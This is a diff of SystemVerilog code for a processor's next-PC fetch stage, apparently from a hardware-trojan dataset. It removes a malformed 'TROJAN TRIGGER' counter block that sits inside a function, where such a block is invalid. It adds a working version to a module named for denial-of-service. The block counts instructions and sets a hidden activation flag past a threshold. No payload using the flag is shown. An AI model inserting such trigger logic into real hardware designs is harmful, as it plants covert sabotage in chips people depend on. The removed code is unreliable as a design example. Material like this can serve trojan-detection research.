@@ -16,24 +16,6 @@ import FetchUnitTypes::*;
 
 // Detect the cache line boundary in sequential access
 function automatic logic StepOverCacheLine (PC_Path pc1, PC_Path pc2);
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 18479;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (numValidInsns) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
     return pc1[ICACHE_LINE_BYTE_NUM_BIT_WIDTH] != pc2[ICACHE_LINE_BYTE_NUM_BIT_WIDTH];
 endfunction
 
@@ -44,6 +26,23 @@ module NextPCStage_trojan_DoS(
     ControllerIF.NextPCStage ctrl,
     DebugIF.NextPCStage debug
 );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=20721)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 20721;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (numValidInsns) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
 
 `ifdef RSD_STOP_FETCH_ON_PRED_MISS
     typedef enum logic {
